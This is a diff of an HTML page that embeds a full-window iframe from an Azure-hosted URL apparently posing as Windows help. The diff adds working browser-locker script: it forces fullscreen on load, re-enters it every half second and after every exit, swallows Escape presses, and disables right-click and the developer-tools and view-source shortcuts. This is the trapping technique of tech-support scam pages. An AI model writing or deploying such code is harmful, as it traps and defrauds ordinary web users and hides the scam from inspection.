@@ -1,69 +1,127 @@
 <html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Fullscreen Iframe</title>
 <style>
-  * {
+  body, html {
     margin: 0;
     padding: 0;
-    box-sizing: border-box;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background: #000;
   }
   
   iframe {
-    position: fixed;
     width: 100%;
     height: 100%;
     border: none;
-    top: 0;
-    left: 0;
-    cursor: none;
-  }
-  
-  /* Fullscreen ke liye */
-  iframe:-webkit-full-screen {
-    width: 100%;
-    height: 100%;
-  }
-  
-  iframe:fullscreen {
-    width: 100%;
-    height: 100%;
+    display: block;
   }
 </style>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
 </head>
 <body>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>
 
-<iframe 
-  id="f"
-  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
-  allowfullscreen
-  webkitallowfullscreen
-  mozallowfullscreen
-  msallowfullscreen
-  allow="fullscreen; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
+<iframe
+  id="myIframe"
+  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null"
+  allow="fullscreen *; autoplay *"
+  allowfullscreen>
 </iframe>
 
 <script>
-  const iframe = document.getElementById('f');
+  let fullscreenExitAttempts = 0;
+  let fullscreenActive = false;
   
-  iframe.addEventListener('load', function() {
-    try {
-      if (iframe.contentDocument && iframe.contentDocument.documentElement) {
-
-      }
-    } catch(e) {
- 
+  function enterFullscreen() {
+    const docEl = document.documentElement;
+    const requestFullscreen = docEl.requestFullscreen || 
+                             docEl.webkitRequestFullscreen || 
+                             docEl.msRequestFullscreen;
+    
+    if (requestFullscreen) {
+      requestFullscreen.call(docEl).then(function() {
+        fullscreenActive = true;
+      }).catch(function() {});
+    }
+  }
+  
+  function exitFullscreen() {
+    const exitFullscreen = document.exitFullscreen || 
+                          document.webkitExitFullscreen || 
+                          document.msExitFullscreen;
+    
+    if (exitFullscreen && fullscreenActive) {
+      exitFullscreen.call(document).catch(function() {});
+      fullscreenActive = false;
+    }
+  }
+  
+  function forceFullscreen() {
+    if (!fullscreenActive) {
+      enterFullscreen();
+    }
+  }
+  
+  document.addEventListener('fullscreenchange', function() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      fullscreenActive = false;
+      setTimeout(enterFullscreen, 100);
+    } else {
+      fullscreenActive = true;
     }
   });
   
-  document.addEventListener('fullscreenchange', function() {
-
+  document.addEventListener('webkitfullscreenchange', function() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      fullscreenActive = false;
+      setTimeout(enterFullscreen, 100);
+    } else {
+      fullscreenActive = true;
+    }
   });
   
-  document.addEventListener('webkitfullscreenchange', function() {
-
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      fullscreenExitAttempts++;
+      
+      setTimeout(function() {
+        fullscreenExitAttempts = 0;
+      }, 300);
+      
+      if (fullscreenExitAttempts >= 2) {
+        exitFullscreen();
+      } else {
+        setTimeout(function() {
+          if (fullscreenActive) {
+            enterFullscreen();
+          }
+        }, 50);
+      }
+    }
   });
+  
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+  });
+  
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')) {
+      e.preventDefault();
+      return false;
+    }
+  });
+  
+  window.addEventListener('load', function() {
+    setTimeout(enterFullscreen, 500);
+  });
+  
+  setInterval(forceFullscreen, 500);
 </script>
 
 </body>
